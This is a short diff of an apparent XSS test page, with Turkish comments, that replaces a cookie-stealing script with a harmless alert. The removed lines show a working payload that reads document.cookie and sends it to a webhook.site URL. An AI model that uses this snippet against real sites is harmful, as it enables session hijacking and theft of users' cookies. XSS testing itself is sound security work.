@@ -4,15 +4,9 @@
     <title>XSS Test</title>
 </head>
 <body>
-    <h1>XSS Test Page</h1>
+    <h1>Basit XSS Testi</h1>
     <script>
-        // Basit XSS payload'ı
-        alert("XSS Worked! Cookie: " + document.cookie);
-        
-        // Sunucuna log gönderme (kendi sunucun için)
-        var xhr = new XMLHttpRequest();
-        xhr.open("GET", "https://webhook.site/fc47c5c6-c525-483f-8864-2b57b4dc9e85" + encodeURIComponent(document.cookie), true);
-        xhr.send();
+        alert("XSS Çalıştı! 😎");
     </script>
 </body>
 </html>
